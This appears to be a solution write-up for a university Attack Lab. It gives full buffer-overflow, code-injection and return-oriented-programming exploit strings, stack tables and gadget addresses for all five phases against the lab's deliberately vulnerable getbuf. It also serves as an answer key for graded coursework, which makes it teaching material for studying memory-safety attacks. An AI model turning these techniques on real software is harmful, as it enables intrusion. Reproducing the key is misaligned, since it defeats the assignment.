# Common utility

## Assmebly code of the target function (getbuf)

```asm
getbuf:
  0x00000000004017a8 <+0>:	sub    $0x28,%rsp        # allocate 40 bytes to stack
  0x00000000004017ac <+4>:	mov    %rsp,%rdi
  0x00000000004017af <+7>:	call   0x401a40 <Gets>
  0x00000000004017b4 <+12>:	mov    $0x1,%eax
  0x00000000004017b9 <+17>:	add    $0x28,%rsp
  0x00000000004017bd <+21>:	ret
```

## ctarget stack at getbuf

- BUFFER_SIZE = 40 (0x28) bytes

| Address            | Name        | offset | Address[hex string]     | Description           |
| ------------------ | ----------- | ------ | ----------------------- | --------------------- |
| 0x000000005561dca0 | return_addr | 40     | a0 dc 61 55 00 00 00 00 | caller return address |
| 0x000000005561dc98 | cbuff_end   | 32     | 98 dc 61 55 00 00 00 00 | buffer end address    |
| 0x000000005561dc90 | cbuff_24    | 24     | 90 dc 61 55 00 00 00 00 |                       |
| 0x000000005561dc88 | cbuff_16    | 16     | 88 dc 61 55 00 00 00 00 |                       |
| 0x000000005561dc80 | cbuff_8     | 8      | 80 dc 61 55 00 00 00 00 |                       |
| 0x000000005561dc78 | cbuff_start | 0      | 78 dc 61 55 00 00 00 00 | buffer start address  |

## Important values

| Name        | Value              | value[hex string]       | Description             |
| ----------- | ------------------ | ----------------------- | ----------------------- |
| touch1_addr | 0x00000000004017c0 | c0 17 40 00 00 00 00 00 | touch1 function address |
| touch2_addr | 0x00000000004017ec | ec 17 40 00 00 00 00 00 | touch2 function address |
| touch3_addr | 0x00000000004018fa | fa 18 40 00 00 00 00 00 | touch3 function address |
| cookie      | 0x0000000059b997fa | fa 97 b9 59 00 00 00 00 | cookie value as int     |
| cookie_str  | ASCII(59b997fa)    | 35 39 62 39 39 37 66 61 | cookie value as string  |
| empty       | 0x0000000000000000 | 00 00 00 00 00 00 00 00 | empty value             |
| filler      | 0xffffffffffffffff | ff ff ff ff ff ff ff ff | filler value            |

# Phase 1 Solution

## Stack State

| Name        | offset | content     | value[hex string]       | comment |
| ----------- | ------ | ----------- | ----------------------- | ------- |
| caller_0    | 0      |             |                         | rsp     |
| return_addr | -8     | touch1_addr | c0 17 40 00 00 00 00 00 | rip     |
| cbuff_end   | -16    | filler      | ff ff ff ff ff ff ff ff |         |
| cbuff_24    | -24    | filler      | ff ff ff ff ff ff ff ff |         |
| cbuff_16    | -32    | filler      | ff ff ff ff ff ff ff ff |         |
| cbuff_8     | -40    | filler      | ff ff ff ff ff ff ff ff |         |
| cbuff_start | -48    | filler      | ff ff ff ff ff ff ff ff |         |

## The Exploit String

```asm
ff ff ff ff ff ff ff ff   /* cbuff_start: filler */
ff ff ff ff ff ff ff ff   /* cbuff_8:     filler */
ff ff ff ff ff ff ff ff   /* cbuff_16:    filler */
ff ff ff ff ff ff ff ff   /* cbuff_24:    filler */
ff ff ff ff ff ff ff ff   /* cbuff_end:   filler */
c0 17 40 00 00 00 00 00   /* return_addr: touch1_addr */
```

# Phase 2 Solution

## Stack State

| Name        | offset | content      | value[hex string]       | comment |
| ----------- | ------ | ------------ | ----------------------- | ------- |
| caller_0    | 0      |              |                         | rsp     |
| return_addr | -8     | cbuff_start  | 78 dc 61 55 00 00 00 00 |         |
| cbuff_end   | -16    | touch2_addr  | ec 17 40 00 00 00 00 00 |         |
| cbuff_24    | -24    | filler       | ff ff ff ff ff ff ff ff |         |
| cbuff_16    | -32    | filler       | ff ff ff ff ff ff ff ff |         |
| cbuff_8     | -40    | exploit_code | 59 c3 ff ff ff ff ff ff |         |
| cbuff_start | -48    | exploit_code | 48 83 ec 10 bf fa 97 b9 | rip     |

## The Exploit Code

```asm
exploit_code:
  0:	48 83 ec 10         sub    $0x10,%rsp           # rsp = cbuff_end (&touch2_addr)
  4:	bf fa 97 b9 59      mov    $0x59b997fa,%edi     # edi = cookie
  9:	c3                  ret                         # return (call touch2)
```

expliot_code: `48 83 ec 10 bf fa 97 b9 59 c3`

## The Exploit String

```asm
48 83 ec 10 bf fa 97 b9   /* cbuff_start: exploit_code */
59 c3 ff ff ff ff ff ff   /* cbuff_8:     exploit_code */
ff ff ff ff ff ff ff ff   /* cbuff_16:    filler */
ff ff ff ff ff ff ff ff   /* cbuff_24:    filler */
ec 17 40 00 00 00 00 00   /* cbuff_end:   touch2_addr */
78 dc 61 55 00 00 00 00   /* return_addr: cbuff_start */
```

# Phase 3 Solution

## Stack State

| Name        | offset | content      | value[hex string]       | comment |
| ----------- | ------ | ------------ | ----------------------- | ------- |
| caller_0    | 0      |              |                         | rsp     |
| return_addr | -8     | cbuff_start  | 78 dc 61 55 00 00 00 00 |         |
| cbuff_end   | -16    | empty        | 00 00 00 00 00 00 00 00 |         |
| cbuff_24    | -24    | cookie_str   | 35 39 62 39 39 37 66 61 |         |
| cbuff_16    | -32    | touch3_addr  | fa 18 40 00 00 00 00 00 |         |
| cbuff_8     | -40    | exploit_code | 08 c3 ff ff ff ff ff ff |         |
| cbuff_start | -48    | exploit_code | 48 83 ec 20 48 8d 7c 24 | rip     |

## The Exploit Code

```asm
exploit_code:
  0:	48 83 ec 20         sub    $0x20,%rsp         # rsp = cbuff_16 (&touch3_addr)
  4:	48 8d 7c 24 08      lea    0x8(%rsp),%rdi     # rdi = cbuff_24 (&cookie_str)
  9:	c3                  ret                       # return (call touch3)
```

exploit_code: `48 83 ec 20 48 8d 7c 24 08 c3`

## The Exploit String

```asm
48 83 ec 20 48 8d 7c 24   /* cbuff_start: exploit_code */
08 c3 ff ff ff ff ff ff   /* cbuff_8:     exploit_code */
fa 18 40 00 00 00 00 00   /* cbuff_16:    touch3_addr */
35 39 62 39 39 37 66 61   /* cbuff_24:    cookie_str */
00 00 00 00 00 00 00 00   /* cbuff_end:   empty */
78 dc 61 55 00 00 00 00   /* return_addr: cbuff_start */
```

# Gadgets

## Gadgets Table

| Name     | Address            | Address[hex string]     | Effect                 |
| -------- | ------------------ | ----------------------- | ---------------------- |
| gadget_1 | 0x00000000004019cc | cc 19 40 00 00 00 00 00 | pop %rax               |
| gadget_2 | 0x00000000004019c5 | c5 19 40 00 00 00 00 00 | movq %rax, %rdi        |
| gadget_3 | 0x0000000000401a06 | 06 1a 40 00 00 00 00 00 | movq %rsp, %rax        |
| gadget_4 | 0x00000000004019dd | dd 19 40 00 00 00 00 00 | movl %eax, %edx        |
| gadget_5 | 0x0000000000401a34 | 34 1a 40 00 00 00 00 00 | movl %edx, %ecx        |
| gadget_6 | 0x0000000000401a13 | 13 1a 40 00 00 00 00 00 | movl %ecx, %esi        |
| gadget_7 | 0x00000000004019d6 | d6 19 40 00 00 00 00 00 | lea (%rdi,%rsi,1),%rax |

## Gadgets Details (Assembly Code)

```asm
gadget_1 <0x00000000004019cc>:
  58        pop   %rax
  90        nop
  c3        ret

gadget_2 <0x00000000004019c5>:
  48 89 c7  movq  %rax, %rdi    # rdi = rax
  90        nop
  c3        ret

gadget_3 <0x0000000000401a06>:
  48 89 e0  movq %rsp, %rax     # rax = rsp
  c3        ret

gadget_4 <0x00000000004019dd>:
  89 c2     movl %eax, %edx     # edx = eax
  90        nop
  c3        ret

gadget_5 <0x0000000000401a34>:
  89 d1     movl  %edx, %ecx    # ecx = edx
  38 c9     cmpb  %cl           # set condition codes <not-effective>
  c3        ret

gadget_6 <0x0000000000401a13>:
  89 ce     movl  %ecx, %esi    # esi = ecx
  90        nop
  90        nop
  c3        ret

gadget_7 <0x00000000004019d6>:
  48 8d 04 37     lea    (%rdi,%rsi,1),%rax   # rax = rdi + rsi
  c3              ret
```

# Phase 4 Solution

## Stack State

| Name        | offset | content     | value[hex string]       | comment |
| ----------- | ------ | ----------- | ----------------------- | ------- |
| caller_16   | 16     | touch2_addr | ec 17 40 00 00 00 00 00 |         |
| caller_8    | 8      | gadget_2    | c5 19 40 00 00 00 00 00 |         |
| caller_0    | 0      | cookie      | fa 97 b9 59 00 00 00 00 | rsp     |
| return_addr | -8     | gadget_1    | cc 19 40 00 00 00 00 00 | rip     |
| rbuff_end   | -16    | filler      | ff ff ff ff ff ff ff ff |         |
| rbuff_24    | -24    | filler      | ff ff ff ff ff ff ff ff |         |
| rbuff_16    | -32    | filler      | ff ff ff ff ff ff ff ff |         |
| rbuff_8     | -40    | filler      | ff ff ff ff ff ff ff ff |         |
| rbuff_start | -48    | filler      | ff ff ff ff ff ff ff ff |         |

## The Exploit String

```asm
ff ff ff ff ff ff ff ff   /* rbuff_start: filler */
ff ff ff ff ff ff ff ff   /* rbuff_8:     filler */
ff ff ff ff ff ff ff ff   /* rbuff_16:    filler */
ff ff ff ff ff ff ff ff   /* rbuff_24:    filler */
ff ff ff ff ff ff ff ff   /* rbuff_end:   filler */
cc 19 40 00 00 00 00 00   /* return_addr: gadget_1 */
fa 97 b9 59 00 00 00 00   /* caller_0:    cookie */
c5 19 40 00 00 00 00 00   /* caller_8:    gadget_2 */
ec 17 40 00 00 00 00 00   /* caller_16:   touch2_addr */
```

# Phase 5 Solution

## Stack State

| Name        | offset | content     | value[hex string]       | comment    |
| ----------- | ------ | ----------- | ----------------------- | ---------- |
| caller_80   | 80     | empty       | 00 00 00 00 00 00 00 00 |            |
| caller_72   | 72     | cookie_str  | 35 39 62 39 39 37 66 61 | cookie_ptr |
| caller_64   | 64     | touch3_addr | fa 18 40 00 00 00 00 00 |            |
| caller_56   | 56     | gadget_2    | c5 19 40 00 00 00 00 00 |            |
| caller_48   | 48     | gadget_7    | d6 19 40 00 00 00 00 00 |            |
| caller_40   | 40     | gadget_2    | c5 19 40 00 00 00 00 00 | stack_ptr  |
| caller_32   | 32     | gadget_3    | 06 1a 40 00 00 00 00 00 |            |
| caller_24   | 24     | gadget_6    | 13 1a 40 00 00 00 00 00 |            |
| caller_16   | 16     | gadget_5    | 34 1a 40 00 00 00 00 00 |            |
| caller_8    | 8      | gadget_4    | dd 19 40 00 00 00 00 00 |            |
| caller_0    | 0      | value(0x20) | 20 00 00 00 00 00 00 00 | rsp        |
| return_addr | -8     | gadget_1    | cc 19 40 00 00 00 00 00 | rip        |
| rbuff_end   | -16    | filler      | ff ff ff ff ff ff ff ff |            |
| rbuff_24    | -24    | filler      | ff ff ff ff ff ff ff ff |            |
| rbuff_16    | -32    | filler      | ff ff ff ff ff ff ff ff |            |
| rbuff_8     | -40    | filler      | ff ff ff ff ff ff ff ff |            |
| rbuff_start | -48    | filler      | ff ff ff ff ff ff ff ff |            |

- cookie_ptr = stack_ptr + value
- value = cookie_ptr - stack_ptr = 72 - 40 = 32 = 0x02

## The Exploit String

```asm
ff ff ff ff ff ff ff ff   /* rbuff_start: filler */
ff ff ff ff ff ff ff ff   /* rbuff_8:     filler */
ff ff ff ff ff ff ff ff   /* rbuff_16:    filler */
ff ff ff ff ff ff ff ff   /* rbuff_24:    filler */
ff ff ff ff ff ff ff ff   /* rbuff_end:   filler */
cc 19 40 00 00 00 00 00   /* return_addr: gadget_1 */
20 00 00 00 00 00 00 00   /* caller_0:    value(0x20) */
dd 19 40 00 00 00 00 00   /* caller_8:    gadget_4 */
34 1a 40 00 00 00 00 00   /* caller_16:   gadget_5 */
13 1a 40 00 00 00 00 00   /* caller_24:   gadget_6 */
06 1a 40 00 00 00 00 00   /* caller_32:   gadget_3 */
c5 19 40 00 00 00 00 00   /* caller_40:   gadget_2 */
d6 19 40 00 00 00 00 00   /* caller_48:   gadget_7 */
c5 19 40 00 00 00 00 00   /* caller_56:   gadget_2 */
fa 18 40 00 00 00 00 00   /* caller_64:   touch3_addr */
35 39 62 39 39 37 66 61   /* caller_72:   cookie_str */
00 00 00 00 00 00 00 00   /* caller_80:   empty */
```
